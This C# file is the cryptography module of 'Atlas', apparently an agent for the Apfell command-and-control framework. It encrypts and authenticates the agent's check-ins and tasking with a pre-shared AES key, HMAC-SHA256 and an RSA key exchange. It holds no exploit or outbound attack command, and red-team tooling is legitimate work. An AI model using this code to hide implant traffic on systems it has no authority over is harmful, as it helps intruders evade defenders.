using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Linq;

namespace Atlas
{
    class Crypto
    {
#if (DEFAULT_EKE || HTTP_EKE)
        /// <summary>
        /// Encrypt any given plaintext with the PSK given
        /// to the agent.
        /// </summary>
        /// <param name="plaintext">Plaintext to encrypt.</param>
        /// <returns>Enrypted string.</returns>
        public static string EncryptStage(string plaintext)
        {
            using (Aes aes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                aes.Key = Convert.FromBase64String(Config.Psk);
                aes.Padding = PaddingMode.PKCS7;
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send uuid:iv:ciphertext:hmac
                    // Concat iv:ciphertext
                    byte[] encrypted = aes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Config.Psk));
                    // Attach hmac to iv:ciphertext
                    byte[] hmac = sha256.ComputeHash(encrypted);
                    // Attach uuid to iv:ciphertext:hmac
                    byte[] final = Encoding.UTF8.GetBytes(Config.PayloadUUID).Concat(encrypted.Concat(hmac).ToArray()).ToArray();
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(final);
                }
            }
        }
#endif 
#if (DEFAULT_PSK || DEFAULT_EKE || HTTP_PSK || HTTP_EKE)
        /// <summary>
        /// Encrypt any given plaintext with the PSK given
        /// to the agent.
        /// </summary>
        /// <param name="plaintext">Plaintext to encrypt.</param>
        /// <returns>Enrypted string.</returns>
        public static string EncryptCheckin(string plaintext)
        {
            using (Aes aes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                aes.Key = Convert.FromBase64String(Config.Psk);
                aes.Padding = PaddingMode.PKCS7;
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send uuid:iv:ciphertext:hmac
                    // Concat iv:ciphertext
                    byte[] encrypted = aes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Config.Psk));
                    // Attach hmac to iv:ciphertext
                    byte[] hmac = sha256.ComputeHash(encrypted);
                    // Attach uuid to iv:ciphertext:hmac
#if (DEFAULT_EKE || HTTP_EKE)
                    byte[] final = Encoding.UTF8.GetBytes(Config.tempUUID).Concat(encrypted.Concat(hmac).ToArray()).ToArray();
#else
                    byte[] final = Encoding.UTF8.GetBytes(Config.PayloadUUID).Concat(encrypted.Concat(hmac).ToArray()).ToArray();
#endif
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(final);
                }
            }
        }

        /// <summary>
        /// Encrypt any given plaintext with the PSK given
        /// to the agent.
        /// </summary>
        /// <param name="plaintext">Plaintext to encrypt.</param>
        /// <returns>Enrypted string.</returns>
        public static string Encrypt(string plaintext)
        {
            using (Aes aes = Aes.Create())
            {
                // Use our PSK (generated in Apfell payload config) as the AES key
                aes.Key = Convert.FromBase64String(Config.Psk);
                aes.Padding = PaddingMode.PKCS7;
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream encryptMemStream = new MemoryStream())
                using (CryptoStream encryptCryptoStream = new CryptoStream(encryptMemStream, encryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter encryptStreamWriter = new StreamWriter(encryptCryptoStream))
                        encryptStreamWriter.Write(plaintext);
                    // We need to send uuid:iv:ciphertext:hmac
                    // Concat iv:ciphertext
                    byte[] encrypted = aes.IV.Concat(encryptMemStream.ToArray()).ToArray();
                    HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Config.Psk));
                    // Attach hmac to iv:ciphertext
                    byte[] hmac = sha256.ComputeHash(encrypted);
                    // Attach uuid to iv:ciphertext:hmac
                    byte[] final = Encoding.UTF8.GetBytes(Config.UUID).Concat(encrypted.Concat(hmac).ToArray()).ToArray();
                    // Return base64 encoded ciphertext
                    return Convert.ToBase64String(final);
                }
            }
        }

        /// <summary>
        /// Decrypt a string which has been encrypted with the PSK.
        /// </summary>
        /// <param name="encrypted">The encrypted string.</param>
        /// <returns></returns>
        public static string Decrypt(string encrypted)
        {
            byte[] input = Convert.FromBase64String(encrypted);

            int uuidLength = Config.PayloadUUID.Length;
            // Input is uuid:iv:ciphertext:hmac, IV is 16 bytes
            byte[] uuidInput = new byte[uuidLength];
            Array.Copy(input, uuidInput, uuidLength);

            byte[] IV = new byte[16];
            Array.Copy(input, uuidLength, IV, 0, 16);

            byte[] ciphertext = new byte[input.Length - uuidLength - 16 - 32];
            Array.Copy(input, uuidLength + 16, ciphertext, 0, ciphertext.Length);

            HMACSHA256 sha256 = new HMACSHA256(Convert.FromBase64String(Config.Psk));
            byte[] hmac = new byte[32];
            Array.Copy(input, uuidLength + 16 + ciphertext.Length, hmac, 0, 32);

            if (Convert.ToBase64String(hmac) == Convert.ToBase64String(sha256.ComputeHash(IV.Concat(ciphertext).ToArray())))
            {
                using (Aes aes = Aes.Create())
                {
                    // Use our PSK (generated in Apfell payload config) as the AES key
                    aes.Key = Convert.FromBase64String(Config.Psk);
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, IV);

                    using (MemoryStream decryptMemStream = new MemoryStream(ciphertext))
                    using (CryptoStream decryptCryptoStream = new CryptoStream(decryptMemStream, decryptor, CryptoStreamMode.Read))
                    using (StreamReader decryptStreamReader = new StreamReader(decryptCryptoStream))
                    {
                        string decrypted = decryptStreamReader.ReadToEnd();
                        // Return decrypted message from Apfell server
                        return Encoding.UTF8.GetString(uuidInput) + decrypted;
                    }
                }
            }
            else
            {
                return "";
            }
        }
#endif
#if (DEFAULT_EKE || HTTP_EKE)
        public static void GenRsaKeys()
        {

            Config.Rsa = new RSACryptoServiceProvider(4096) 
            {
                PersistKeyInCsp = false
            };
        }

        public static byte[] RsaDecrypt(byte[] Data)
        {
            Config.Rsa.ImportParameters(Config.Rsa.ExportParameters(true));
            byte[] final = Config.Rsa.Decrypt(Data, true);
            return final;
        }

        public static string GetPubKey()
        {
            StringWriter outStream = new StringWriter();
            ExportPublicKey(Config.Rsa, outStream);
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(outStream.ToString()));
        }

        // https://stackoverflow.com/questions/28406888/c-sharp-rsa-public-key-output-not-correct/28407693#28407693
        private static void ExportPublicKey(RSACryptoServiceProvider csp, TextWriter outputStream)
        {
            var parameters = csp.ExportParameters(false);
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);
                writer.Write((byte)0x30); // SEQUENCE
                using (var innerStream = new MemoryStream())
                {
                    var innerWriter = new BinaryWriter(innerStream);
                    innerWriter.Write((byte)0x30); // SEQUENCE
                    EncodeLength(innerWriter, 13);
                    innerWriter.Write((byte)0x06); // OBJECT IDENTIFIER
                    var rsaEncryptionOid = new byte[] { 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01 };
                    EncodeLength(innerWriter, rsaEncryptionOid.Length);
                    innerWriter.Write(rsaEncryptionOid);
                    innerWriter.Write((byte)0x05); // NULL
                    EncodeLength(innerWriter, 0);
                    innerWriter.Write((byte)0x03); // BIT STRING
                    using (var bitStringStream = new MemoryStream())
                    {
                        var bitStringWriter = new BinaryWriter(bitStringStream);
                        bitStringWriter.Write((byte)0x00); // # of unused bits
                        bitStringWriter.Write((byte)0x30); // SEQUENCE
                        using (var paramsStream = new MemoryStream())
                        {
                            var paramsWriter = new BinaryWriter(paramsStream);
                            EncodeIntegerBigEndian(paramsWriter, parameters.Modulus); // Modulus
                            EncodeIntegerBigEndian(paramsWriter, parameters.Exponent); // Exponent
                            var paramsLength = (int)paramsStream.Length;
                            EncodeLength(bitStringWriter, paramsLength);
                            bitStringWriter.Write(paramsStream.GetBuffer(), 0, paramsLength);
                        }
                        var bitStringLength = (int)bitStringStream.Length;
                        EncodeLength(innerWriter, bitStringLength);
                        innerWriter.Write(bitStringStream.GetBuffer(), 0, bitStringLength);
                    }
                    var length = (int)innerStream.Length;
                    EncodeLength(writer, length);
                    writer.Write(innerStream.GetBuffer(), 0, length);
                }

                var base64 = Convert.ToBase64String(stream.GetBuffer(), 0, (int)stream.Length).ToCharArray();
                outputStream.WriteLine("-----BEGIN PUBLIC KEY-----");
                for (var i = 0; i < base64.Length; i += 64)
                {
                    outputStream.WriteLine(base64, i, Math.Min(64, base64.Length - i));
                }
                outputStream.WriteLine("-----END PUBLIC KEY-----");
            }
        }

        private static void EncodeLength(BinaryWriter stream, int length)
        {
            if (length < 0) throw new ArgumentOutOfRangeException("length", "Length must be non-negative");
            if (length < 0x80)
            {
                // Short form
                stream.Write((byte)length);
            }
            else
            {
                // Long form
                var temp = length;
                var bytesRequired = 0;
                while (temp > 0)
                {
                    temp >>= 8;
                    bytesRequired++;
                }
                stream.Write((byte)(bytesRequired | 0x80));
                for (var i = bytesRequired - 1; i >= 0; i--)
                {
                    stream.Write((byte)(length >> (8 * i) & 0xff));
                }
            }
        }

        private static void EncodeIntegerBigEndian(BinaryWriter stream, byte[] value, bool forceUnsigned = true)
        {
            stream.Write((byte)0x02); // INTEGER
            var prefixZeros = 0;
            for (var i = 0; i < value.Length; i++)
            {
                if (value[i] != 0) break;
                prefixZeros++;
            }
            if (value.Length - prefixZeros == 0)
            {
                EncodeLength(stream, 1);
                stream.Write((byte)0);
            }
            else
            {
                if (forceUnsigned && value[prefixZeros] > 0x7f)
                {
                    // Add a prefix zero to force unsigned if the MSB is 1
                    EncodeLength(stream, value.Length - prefixZeros + 1);
                    stream.Write((byte)0);
                }
                else
                {
                    EncodeLength(stream, value.Length - prefixZeros);
                }
                for (var i = prefixZeros; i < value.Length; i++)
                {
                    stream.Write(value[i]);
                }
            }
        }
#endif
    }
}
